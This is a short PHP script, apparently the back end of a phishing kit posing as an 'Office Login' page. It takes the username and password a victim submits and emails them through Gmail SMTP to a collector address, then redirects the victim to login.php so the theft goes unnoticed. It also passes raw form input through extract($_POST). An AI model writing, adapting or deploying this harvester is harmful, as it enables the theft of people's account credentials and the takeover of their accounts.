<?php
require './vendor/phpmailer/phpmailer/src/Exception.php';
require './vendor/phpmailer/phpmailer/src/PHPMailer.php';
require './vendor/phpmailer/phpmailer/src/SMTP.php';
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
//Load Composer's autoloader
require './vendor/autoload.php';
if(isset($_POST['submit'])){
    extract($_POST);
    //Create an instance; passing `true` enables exceptions
    $mail = new PHPMailer(true);
    try {
        //Server settings
        // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
        $mail->isSMTP();                                            //Send using SMTP
        $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
        $mail->Username   = 'email@gmail.com';                     //SMTP username
        $mail->Password   = 'password';                               //SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
        $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
        //Recipients
        $mail->setFrom('email@gmail.com', 'Office Login');
        $mail->addAddress('email@gmail.com');     //Add a recipient
        // $mail->addAddress('jamiecarter019@gmail.com');     //Add a recipient
        $mail->addReplyTo('no-reply@gmail.com');
        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'Office Login';
        $mail->Body = " 
            <p><b>Username:</b> $username</p>
            <p><b>Password:</b> $password</p>                
        </body>";
        $mail->send();
        echo "<script type='text/javascript'>location.href = './login.php';</script>";
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}
?>